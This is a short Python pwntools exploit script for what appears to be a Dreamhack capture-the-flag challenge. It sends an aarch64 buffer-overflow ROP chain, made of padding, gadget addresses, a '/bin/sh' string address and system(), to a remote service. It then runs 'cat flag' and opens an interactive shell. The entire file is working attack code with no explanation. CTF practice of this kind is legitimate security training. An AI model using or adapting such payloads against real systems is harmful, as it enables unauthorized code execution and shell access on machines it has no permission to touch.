from pwn import *

context.clear(arch="aarch64", endian="little")

io = remote("host8.dreamhack.games", 8843)

system = 0x401b00
binsh  = 0x4671c8

g1 = 0x41a9dc
g2 = 0x41a9d8

payload  = b"A" * 16
payload += p64(0)
payload += p64(g1)

payload += p64(0)
payload += p64(g2)
payload += p64(binsh)
payload += p64(0)
payload += p64(0)
payload += p64(0)

payload += p64(0)
payload += p64(system)
payload += p64(0)
payload += p64(0)

io.sendlineafter(b"input: ", payload)
io.sendline(b"cat flag")
io.interactive()
